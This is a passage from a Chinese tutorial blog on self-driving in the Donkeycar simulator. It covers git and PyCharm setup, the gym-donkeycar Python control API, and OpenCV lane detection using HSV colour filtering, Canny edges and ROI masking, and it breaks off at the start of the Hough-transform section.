title="1.2.3配置git"></a>1.2.3配置git</h4><p>安装成功后，配置git</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line"></span><br><span class="line">git config --global user.email  &quot;用户邮箱&quot;</span><br></pre></td></tr></table></figure><p><strong>请注意此处空格必须严格遵循，否则将无法配置成功。建议直接复制过去改。</strong></p><p>检查配置是否成功。在最下面会出现属性user.name与user.email，如果没有请重新到回到上一步。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure><h4 id="1-2-4在pycharm中配置git"><a href="#1-2-4在pycharm中配置git" class="headerlink" title="1.2.4在pycharm中配置git"></a>1.2.4在pycharm中配置git</h4><p>file-&gt;settings-&gt;version control-&gt;git，一般此处默认检测系统中安装的第一个git，如果没有检测到请手动选择。</p><p> <a href="https://blog.csdn.net/zeroooorez/article/details/94715752">具体git操作请参照这篇文章</a> 这里不进行描述。</p><p>###1.3自动驾驶初体验</p><p>这个模拟器的好处就在于预留了Python控制接口，我们只需要安装一个驱动库就可以直接驱动模拟器里面的小车运行（提前安装好Git工具）：</p><p>在pycharm下方终端输入以下pip命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install git+https://github.com/tawnkramer/gym-donkeycar</span><br></pre></td></tr></table></figure><p> 安装好以后我们可以运行下面的python代码来实现小车的控制（注意：运行下面的代码前先启动模拟器，并停留在模拟器对应地图里） ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入库</span></span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 设置模拟器环境</span></span><br><span class="line">env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重置当前场景</span></span><br><span class="line">obv = env.reset()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行100帧</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="comment"># 定义控制动作</span></span><br><span class="line">    action = np.array([<span class="number">0.3</span>,<span class="number">0.5</span>]) <span class="comment"># 动作控制，0.3表示转向，0.5表示油门</span></span><br><span class="line">    <span class="comment"># 执行动作</span></span><br><span class="line">    obv, reward, done, info = env.step(action)</span><br><span class="line">    <span class="comment"># 取一张图像保存</span></span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">20</span>:</span><br><span class="line">        img = cv2.cvtColor(obv,cv2.COLOR_RGB2BGR)</span><br><span class="line">        cv2.imwrite(<span class="string">&#x27;test.jpg&#x27;</span>,img)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">obv = env.reset()</span><br></pre></td></tr></table></figure><p> 我们先分析下这段代码。下面这行代码用于设置模拟器环境，简单来说就是启用哪张地图： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br></pre></td></tr></table></figure><p>在这个模拟器里面我们可以用到的地图如下所示：</p><ul><li><p>“donkey-warehouse-v0”</p></li><li><p>“donkey-generated-roads-v0”</p></li><li><p>“donkey-avc-sparkfun-v0”</p></li><li><p>“donkey-generated-track-v0”</p></li><li><p>“donkey-roboracingleague-track-v0”</p></li><li><p>“donkey-waveshare-v0”</p></li><li><p>“donkey-minimonaco-track-v0”</p></li><li><p>“donkey-warren-track-v0”</p></li><li><p>“donkey-thunderhill-track-v0”</p></li><li><p>“donkey-circuit-launch-track-v0”<br>  接下来的代码里面，我们运行了100帧，每帧都用固定的控制参数来执行：右转0.3、前进0.5。这两个字段就是我们前面提到的转向和油门值。下面给出这两个值的具体定义：</p></li></ul><p>油门值取值范围是[-1，1]，负值代表倒退，正值代表前进。转向值取值范围也是[-1，1]，负值代表向左，正值代表向右。</p><p>接下来使用np.array封装这两个参数，然后通过env.step来执行单步动作。执行完动作以后会返回一些信息，其中我们需要重点关注obs这个返回参数，这个参数表示当前位于小车正中间行车记录仪摄像头返回的一帧图像 ，图像宽160像素，高120像素，3通道RGB图像。可以在代码根目录下找到test.jpg文件查看。</p><p><a href="https://www.bilibili.com/video/BV1Wy4y1h7ii?share_source=copy_web">numpy教程十分钟入门</a></p><p><a href="https://www.bilibili.com/video/BV1Fo4y1d7JL?share_source=copy_web">openCV教程 黑马程序员</a></p><p>建议观看以上视频，学习一定的基础知识。当然没有这样的知识硬记语法也是可以的。</p><h2 id="2-基于OpenCV的自动驾驶控制"><a href="#2-基于OpenCV的自动驾驶控制" class="headerlink" title="2.基于OpenCV的自动驾驶控制"></a>2.基于OpenCV的自动驾驶控制</h2><p>在学习自动驾驶前，我们先看看传统算法是怎么解决自动驾驶任务的。本节为后续自动驾驶作铺垫，如果不感兴趣可以直接跳转到深度学习部分。</p><p>我们希望通过算法来控制小车，最终让这个小车稳定运行在行车道内。这里面涉及到两方面：感知和动作规划。感知部分我们主要通过行道线检测来实现，动作规划通过操控转向角度来实现。行道线检测的目的就是希望能够根据检测到的行道线位置来计算最终应该转向的角度，从而控制小车始终运行在当前车道线内。</p><p>由于道路环境比较简单，针对我们这个任务，我们进一步简化我们的控制变量，我们只控制转向角度，对于油门值我们在运行时保持低匀速，这样我们的重点就可以放在一个变量上面—转向角度。</p><h3 id="2-1基于HSV空间的特定颜色区域提取"><a href="#2-1基于HSV空间的特定颜色区域提取" class="headerlink" title="2.1基于HSV空间的特定颜色区域提取"></a>2.1基于HSV空间的特定颜色区域提取</h3><p> 颜色过滤是目前经常被使用到的图像处理技巧之一，例如天气预报抠像等，经常会使用绿幕作为背景进行抠图。本小节使用颜色过滤来初步提取出行道线。 </p><p>从模拟平台的图像数据上进行分析，小车左侧是黄实线，右侧是白实线。我们希望小车一直运行在这两根线之间。因此，我们首先要定位出这两根线。我们可以通过颜色空间变换来定位这两根线。</p><p>为了方便将黄色线和白色线从图像中过滤出来，我们需要将图像从RGB空间转换到HSV空间再处理。</p><p>这里首先我们解释下RGB和HSV颜色空间的区别。</p><p>RGB 是我们接触最多的颜色空间，由三个通道表示一幅图像，分别为红色(R)，绿色(G)和蓝色(B)。这三种颜色的不同组合可以形成几乎所有的其他颜色。RGB 颜色空间是图像处理中最基本、最常用、面向硬件的颜色空间，比较容易理解。RGB 颜色空间利用三个颜色分量的线性组合来表示颜色，任何颜色都与这三个分量有关，而且这三个分量是高度相关的，所以连续变换颜色时并不直观，想对图像的颜色进行调整需要更改这三个分量才行。自然环境下获取的图像容易受自然光照、遮挡和阴影等情况的影响，即对亮度比较敏感。而 RGB 颜色空间的三个分量都与亮度密切相关，即只要亮度改变，三个分量都会随之相应地改变，而没有一种更直观的方式来表达。但是人眼对于这三种颜色分量的敏感程度是不一样的，在单色中，人眼对红色最不敏感，蓝色最敏感，所以 RGB 颜色空间是一种均匀性较差的颜色空间。如果颜色的相似性直接用欧氏距离来度量，其结果与人眼视觉会有较大的偏差。对于某一种颜色，我们很难推测出较为精确的三个分量数值来表示。所以，RGB 颜色空间适合于显示系统，却并不适合于图像处理。</p><p>基于上述理由，在图像处理中使用较多的是 HSV 颜色空间，它比 RGB 更接近人们对彩色的感知经验。非常直观地表达颜色的色调、鲜艳程度和明暗程度，方便进行颜色的对比。在 HSV 颜色空间下，比 BGR 更容易跟踪某种颜色的物体，常用于分割指定颜色的物体。HSV 表达彩色图像的方式由三个部分组成：</p><ul><li><p>Hue（色调、色相）</p></li><li><p>Saturation（饱和度、色彩纯净度）</p></li><li><p>Value（明度）</p></li></ul><p>其中Hue用角度度量，取值范围为0～360°，表示色彩信息，即所处的光谱颜色的位置，如下图所示。</p><p> <img src="/.io//b544148acdca474388fc0347f155d4f1.png" alt="img"> </p><p>如果我们想要过滤出黄色线，那么我们就可以将色调范围控制在[30~ 90]之间即可。注意：在OpenCV中色调范围是[0~ 180]，因此上述黄色范围需要缩小1倍，即[15~ 45]。检测白色行道线也是采用类似的原理。 </p><p>RGB转化到HSV的算法(c++):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">float</span> <span class="title">retmax</span><span class="params">(<span class="type">float</span> a,<span class="type">float</span> b,<span class="type">float</span> c)</span><span class="comment">//求最大值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> max = <span class="number">0</span>;</span><br><span class="line">    max = a;</span><br><span class="line">    <span class="keyword">if</span>(max&lt;b)</span><br><span class="line">        max = b;</span><br><span class="line">    <span class="keyword">if</span>(max&lt;c)</span><br><span class="line">        max = c;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">retmin</span><span class="params">(<span class="type">float</span> a,<span class="type">float</span> b,<span class="type">float</span> c)</span><span class="comment">//求最小值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> min = <span class="number">0</span>;</span><br><span class="line">    min = a;</span><br><span class="line">    <span class="keyword">if</span>(min&gt;b)</span><br><span class="line">        min = b;</span><br><span class="line">    <span class="keyword">if</span>(min&gt;c)</span><br><span class="line">        min = c;</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//R,G,B参数传入范围（0~100）</span></span><br><span class="line"><span class="comment">//转换结果h(0~360),s(0~100),v(0~100)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rgb_to_hsv</span><span class="params">(<span class="type">float</span> *h,<span class="type">float</span> *s,<span class="type">float</span> *v,<span class="type">float</span> R,<span class="type">float</span> G,<span class="type">float</span> B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> max = <span class="number">0</span>,min = <span class="number">0</span>;</span><br><span class="line">    R = R/<span class="number">100</span>;</span><br><span class="line">    G = G/<span class="number">100</span>;</span><br><span class="line">    B = B/<span class="number">100</span>;</span><br><span class="line"> </span><br><span class="line">    max = <span class="built_in">retmax</span>(R,G,B);</span><br><span class="line">    min = <span class="built_in">retmin</span>(R,G,B);</span><br><span class="line">    *v = max;</span><br><span class="line">    <span class="keyword">if</span>(max == <span class="number">0</span>)</span><br><span class="line">        *s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *s = <span class="number">1</span> - (min/max);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(max == min)</span><br><span class="line">        *h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == R &amp;&amp; G&gt;=B)</span><br><span class="line">        *h = <span class="number">60</span>*((G-B)/(max-min));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == R &amp;&amp; G&lt;B)</span><br><span class="line">        *h = <span class="number">60</span>*((G-B)/(max-min)) + <span class="number">360</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == G)</span><br><span class="line">        *h = <span class="number">60</span>*((B-R)/(max-min)) + <span class="number">120</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max == B)</span><br><span class="line">        *h = <span class="number">60</span>*((R-G)/(max-min)) + <span class="number">240</span>;</span><br><span class="line"> </span><br><span class="line">    *v = *v * <span class="number">100</span>;</span><br><span class="line">    *s = *s * <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HSV转RGB算法：(c++)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数入参范围h(0~360),s(0~100),v(0~100),这里要注意，要把s,v缩放到0~1之间</span></span><br><span class="line"><span class="comment">//转换结果R(0~100),G(0~100),B(0~100)，如需转换到0~255，只需把后面的乘100改成乘255</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hsv_to_rgb</span><span class="params">(<span class="type">int</span> h,<span class="type">int</span> s,<span class="type">int</span> v,<span class="type">float</span> *R,<span class="type">float</span> *G,<span class="type">float</span> *B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">float</span> C = <span class="number">0</span>,X = <span class="number">0</span>,Y = <span class="number">0</span>,Z = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> H=(<span class="type">float</span>)(h);</span><br><span class="line">    <span class="type">float</span> S=(<span class="type">float</span>)(s)/<span class="number">100.0</span>;</span><br><span class="line">    <span class="type">float</span> V=(<span class="type">float</span>)(v)/<span class="number">100.0</span>;</span><br><span class="line">    <span class="keyword">if</span>(S == <span class="number">0</span>)</span><br><span class="line">        *R = *G = *B = V;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        H = H/<span class="number">60</span>;</span><br><span class="line">        i = (<span class="type">int</span>)H;</span><br><span class="line">        C = H - i;</span><br><span class="line"> </span><br><span class="line">        X = V * (<span class="number">1</span> - S);</span><br><span class="line">        Y = V * (<span class="number">1</span> - S*C);</span><br><span class="line">        Z = V * (<span class="number">1</span> - S*(<span class="number">1</span>-C));</span><br><span class="line">        <span class="keyword">switch</span>(i)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> : *R = V; *G = Z; *B = X; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> : *R = Y; *G = V; *B = X; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> : *R = X; *G = V; *B = Z; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span> : *R = X; *G = Y; *B = V; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span> : *R = Z; *G = X; *B = V; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span> : *R = V; *G = X; *B = Y; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *R = *R *<span class="number">100</span>;</span><br><span class="line">    *G = *G *<span class="number">100</span>;</span><br><span class="line">    *B = *B *<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而以上方法在opencv中都有封装，仅需要一句代码即可实现。现在我们来检测黄色线与白色线。</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取图像并转换到HSV空间</span></span><br><span class="line">frame = cv2.imread(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line">hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 黄色线检测</span></span><br><span class="line">lower_blue = np.array([<span class="number">15</span>, <span class="number">40</span>, <span class="number">40</span>])</span><br><span class="line">upper_blue = np.array([<span class="number">45</span>, <span class="number">255</span>, <span class="number">255</span>])</span><br><span class="line">yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;yellow_mask.jpg&#x27;</span>,yellow_mask)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 白色线检测</span></span><br><span class="line">lower_blue = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>])</span><br><span class="line">upper_blue = np.array([<span class="number">180</span>, <span class="number">30</span>, <span class="number">255</span>])</span><br><span class="line">white_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;white_mask.jpg&#x27;</span>,white_mask)</span><br></pre></td></tr></table></figure><p>运行效果如下图：</p><p><img src="/.io//white_mask.jpg"></p><p><img src="/.io//yellow_mask.jpg"></p><p>可以看到还有很大的干扰存在。主要来自于相似的颜色，因此我们还需要进行进一步的处理。</p><h3 id="2-2基于canny算子的边缘轮廓提取"><a href="#2-2基于canny算子的边缘轮廓提取" class="headerlink" title="2.2基于canny算子的边缘轮廓提取"></a>2.2基于canny算子的边缘轮廓提取</h3><p> 目前我们仅获得了行道线区域，为了后续能够方便的计算行道线角度，我们需要得到行道线具体的轮廓&#x2F;线段信息，即从区域中提取出线段。这里我们使用Canny算法实现。</p><p>Canny边缘检测是从不同视觉对象中提取有用的结构信息并大大减少要处理的数据量的一种技术，于1986年被提出，目前已广泛应用于各种计算机视觉系统。</p><p>Canny算法具体包括5个步骤：</p><ol><li><pre><code>   使用高斯滤波器，以平滑图像，滤除噪声。</code></pre></li><li><pre><code>   计算图像中每个像素点的梯度强度和方向。</code></pre></li><li><pre><code>   应用非极大值（Non-Maximum Suppression）抑制，以消除边缘检测带来的杂散响应。</code></pre></li><li><pre><code>   应用双阈值（Double-Threshold）检测来确定真实的和潜在的边缘。</code></pre></li><li><pre><code>   通过抑制孤立的弱边缘最终完成边缘检测。</code></pre></li></ol><p>具体实现细节我们不再详细剖析，在OpenCV中集成了canny算法，只需要一行代码即可实现canny边缘检测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 黄色线边缘提取</span></span><br><span class="line">yellow_edge = cv2.Canny(yellow_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;yellow_edge.jpg&#x27;</span>, yellow_edge)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 白色线边缘提取white</span></span><br><span class="line">white_edge = cv2.Canny(white_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;white_edge.jpg&#x27;</span>, white_edge)</span><br></pre></td></tr></table></figure><p>有兴趣了解canny的同学可以查看<a href="https://blog.csdn.net/sodaANDcola/article/details/119821939">这篇博客</a> ,其中运用到的正态分布、偏导、梯度与极限的知识我们都学过，可以理解。高斯核滤波也用于卷积，而实际上的卷积还会复杂一点，可以自行了解。在后面的pytorch版本我会详细解释运行原理。</p><p> 代码中200和400这两个参数表示canny算子的低、高阈值，按照opencv教程一般可以不用修改。 </p><p> 最终效果： </p><p><img src="/.io//white_edge.jpg"></p><p><img src="/.io//yellow_edge.jpg"></p><h3 id="2-3感兴趣区域-ROI-定位"><a href="#2-3感兴趣区域-ROI-定位" class="headerlink" title="2.3感兴趣区域(ROI)定位"></a>2.3感兴趣区域(ROI)定位</h3><p>在利用OpenCV对图像进行处理时，通常会遇到一个情况，就是只需要对部分感兴趣区域（Region Of Interest, ROI）进行处理。例如针对我们这个模拟平台上的智能小车任务来说，对于黄色行道线，我们只关注图像右下部分，而对于白色行道线，我们只关注图像左下部分即可。至于图像其他部分因为我们通过人工分析知道，这些区域我们并不需要处理。因此，我们只用提取图像的对应区域。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">region_of_interest</span>(<span class="params">edges, color=<span class="string">&#x27;yellow&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    感兴趣区域提取</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = edges.shape</span><br><span class="line">    mask = np.zeros_like(edges)</span><br><span class="line">    <span class="comment"># 定义感兴趣区域掩码轮廓</span></span><br><span class="line">    <span class="keyword">if</span> color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line">        polygon = np.array([[(width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                (width, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                                (width, height),</span><br><span class="line">                                (width * <span class="number">1</span> / <span class="number">2</span>, height)]], np.int32)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        polygon = np.array([[(<span class="number">0</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height * <span class="number">1</span> / <span class="number">2</span>),</span><br><span class="line">                             (width * <span class="number">1</span> / <span class="number">2</span>, height),</span><br><span class="line">                             (<span class="number">0</span>, height)]], np.int32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充感兴趣区域掩码</span></span><br><span class="line">    cv2.fillPoly(mask, polygon, (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    <span class="comment"># 提取感兴趣区域</span></span><br><span class="line">    croped_edge = cv2.bitwise_and(edges, mask)</span><br><span class="line">    <span class="keyword">return</span> croped_edge</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    yimg = cv2.imread(<span class="string">&#x27;yellow_edge.jpg&#x27;</span>)</span><br><span class="line">    wimg = cv2.imread(<span class="string">&#x27;white_edge.jpg&#x27;</span>)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;white_edge_new.jpg&#x27;</span>, region_of_interest(wimg, <span class="string">&#x27;white&#x27;</span>))</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;yellow_edge_new.jpg&#x27;</span>, region_of_interest(yimg))</span><br></pre></td></tr></table></figure><p>这里定义感兴趣区域、填充感兴趣区域是使用了暴力的直接定位法，按住ctrl+函数名可以进入cv2.fillPoly查看函数的参数与具体作用。在实际应用中我们还有一些更加高级的方法来锁定感兴趣区域，但对于模拟器而言这种方法已经够用。注意这一段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    感兴趣区域提取</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = edges.shape</span><br><span class="line">    mask = np.zeros_like(edges)</span><br></pre></td></tr></table></figure><p>edges.shape返回有三个参数，分别为高度、宽度、通道数，如rgb图像就是三通道的。但是下面我们用不到通道数的值，但解包赋值需要把返回值全部接受，因此此处用_ 暂时存放通道数。</p><p>对于如何填充矩形有兴趣的同学，可以查看<a href="https://blog.csdn.net/weixin_43525427/article/details/105317567">这篇博客</a> 。这里进行部分的转载。</p><p>一、fillConvexPoly( )函数<br>以填充矩形为例<br>我图中想填充以1、2、3、4为顶点的矩形，我就要按1、2、3、4的顺序给出坐标序列array，或者是连贯的相邻顶点顺序（比如1432，4321…）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rectangular = np.array([ [<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">740</span>], [<span class="number">4032</span>,<span class="number">740</span>], [<span class="number">4032</span>,<span class="number">0</span>] ])</span><br><span class="line">cv2.fillConvexPoly(img_gray, rectangular, (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p> 效果如下图所示<img src="/.io//20200404212500502.png" alt="在这里插入图片描述"> </p><p>那如果不按邻边顺序，如果我写成1423会如何呢？来看。</p><p> <img src="/.io//20200404213614360.png" alt="在这里插入图片描述"> </p><p>emmm， 我觉得想画五角星的画可以这样。</p><p>二、fillPoly( )函数<br>好了，上面都是基本操作，看看官方教程都可以。<br>我们玩点别的。<br>我如果想把一个矩形区域留住（拿车牌举例），剩下的填充为白色应该怎么办呢？<br>举一反三一下，两种办法：<br>（1）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cv2.fillPoly(img_gray, [rec1, rec2, rec3, rec4], (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br></pre></td></tr></table></figure><p>四个矩形，改用fillPoly（）方法。</p><p> <img src="/.io//20200404221502411.png" alt="在这里插入图片描述"> </p><p>结果如上图。</p><p>（2）非要死脑筋其实用fillConvexPoly( )也不是不可以。</p><p> <img src="/.io//2020040422244385.png" alt="在这里插入图片描述"> </p><p>画个示意图，你们懂我意思吧。</p><p>定位后，我们的图片如下所示，可以看到更加“整洁”了。</p><p><img src="/.io//white_edge_new.jpg"></p><p><img src="/.io//yellow_edge_new.jpg"></p><p>###2.4基于霍夫变换的线段检测</p><p>到目前，我们抽取出了比较精确的行道线轮廓，但是对于实际的自动驾驶任务来说还没有完成目标任务要求，我们要对行道线轮廓再进一步处理，得到行道线的具体线段信息（每条线段的起始点坐标）。本小节我们使用霍夫变换来完成这个任务。霍夫变换，英文名称Hough Transform，作用是用来检测图像中的直线或者圆等几何图形的。</p><p>具体的，一条直线的表示方法有好多种，最常见的是y&#x3D;mx+b的形式。结合我们这个任务，对于最终检测出的感兴趣区域，怎么把图片中的直线提取出来。基本的思考流程是：如果直线 y&#x3D;mx+b 